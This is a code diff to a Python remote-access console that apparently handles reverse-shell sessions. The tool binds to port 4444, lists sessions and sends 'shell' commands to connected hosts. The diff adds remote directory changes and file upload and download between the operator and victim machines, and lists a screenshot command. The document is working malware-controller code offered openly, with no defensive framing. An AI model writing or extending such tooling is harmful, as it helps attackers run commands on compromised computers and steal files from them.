@@ -1,10 +1,12 @@
 '''
 some doc will be here
 '''
+from genericpath import isfile
 import subprocess
 from socket import socket
 from threading import Thread
 from time import sleep
+import os
 
 class Session:
     note = ""
@@ -29,11 +31,26 @@ class Session:
 
             if first == '':
                 continue
+            elif first == 'cd':
+                self.sock.send(cmd.encode('gbk'))
+                self.prompt = self.sock.recv(1024).decode('gbk')
             elif first == 'exit':
                 self.sock.close()
                 break
             elif first == 'bg':
                 break
+            elif first == 'up':
+                if len(other)==3:
+                    self.upload(other[1],other[2])
+                else:
+                    print('[-] up src dst')
+
+            elif first == 'down':
+                if len(other)==3:
+                    self.download(other[1],other[2])
+                else:
+                    print('[-] down src dst')
+
             else:
                 self.sock.send(('shell '+cmd).encode('gbk'))
                 flag = True
@@ -47,10 +64,28 @@ class Session:
                     except Exception as e:
                         print(e)
 
-    def upload(self):
-        pass
-    def download(self):
-        pass
+    def upload(self,src,dst):
+        if os.path.isfile(src):
+            fsize = os.path.getsize(src)
+            cmd = f'upload {dst} {fsize}'
+            self.sock.send(cmd.encode('gbk'))
+            with open(src,'rb') as f:
+                content = f.read()
+                self.sock.send(content)
+            print('[+] Upload successfully!')
+        else:
+            print(f'[-] {src} not found!')
+    def download(self,src,dst):
+        cmd = f"download {src}"
+        self.sock.send(cmd.encode('gbk'))
+        fsize = int(self.sock.recv(1024).decode('gbk'))
+        if fsize !=0:
+            with open(dst,'wb') as f:
+                content = self.sock.recv(fsize)
+                f.write(content)
+            print('[+] Download successfully!')
+        else:
+            print(f'[-] {src} not found')
                             
 
 
@@ -73,8 +108,9 @@ def showhelp():
  sessions
  bind 0.0.0.0 4444
  ----------------for-shell-------------------- 
- up souce dest
- down desr source''')
+ up src dst
+ down src dst
+ screenshot''')
 
 def exploit():
     global idx, sessions
@@ -109,7 +145,7 @@ if __name__ == '__main__':
             first = opts[0]
 
             if   first == 'exit':
-                exit(0)
+                os._exit(0)
 
             elif first == 'help':
                 showhelp()
